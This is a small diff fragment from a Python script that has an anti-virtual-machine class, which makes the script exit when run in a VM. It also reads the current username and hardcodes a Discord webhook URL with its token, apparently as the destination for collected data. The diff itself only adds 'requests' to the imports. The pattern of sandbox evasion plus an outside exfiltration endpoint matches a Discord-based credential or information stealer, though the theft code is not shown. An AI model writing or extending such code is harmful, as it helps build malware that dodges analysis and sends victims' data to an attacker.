@@ -59,7 +59,7 @@ class AntiVM:
             os._exit(1)
         except:pass
 c = AntiVM
-import re, subprocess
+import re, subprocess , requests
 import getpass;user=getpass.getuser()
 from discord import SyncWebhook
 hook = "https://discord.com/api/webhooks/1306568771644690542/jSSKvJ8P9PyM9Vgv2qv4n5SqN5kFabj3pC1MHdfu6jLaOddhdr4QX-zotnPNZMxo5AeM"
